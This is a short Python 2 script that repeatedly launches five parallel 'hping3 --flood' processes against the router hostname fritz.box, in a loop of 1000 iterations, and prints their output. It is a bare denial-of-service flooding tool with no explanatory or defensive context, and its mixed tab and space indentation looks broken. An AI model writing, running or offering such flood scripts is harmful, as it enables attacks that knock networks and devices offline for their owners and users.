for i in range(1000):
	import os
	stdout_handle = os.popen("hping3 --flood fritz.box", "r")
	stdout_handle_a = os.popen("hping3 --flood fritz.box", "r")
	stdout_handle_b = os.popen("hping3 --flood fritz.box", "r")
	stdout_handle_c = os.popen("hping3 --flood fritz.box", "r")
	stdout_handle_d = os.popen("hping3 --flood fritz.box", "r")


	text = stdout_handle.read()
        text_a = stdout_handle_a.read()
        text_b = stdout_handle_b.read()
        text_c = stdout_handle_c.read()
        text_d = stdout_handle_d.read()
	for i in range(1):
		print text
		print text_a
		print text_b
		print text_c
		print text_d
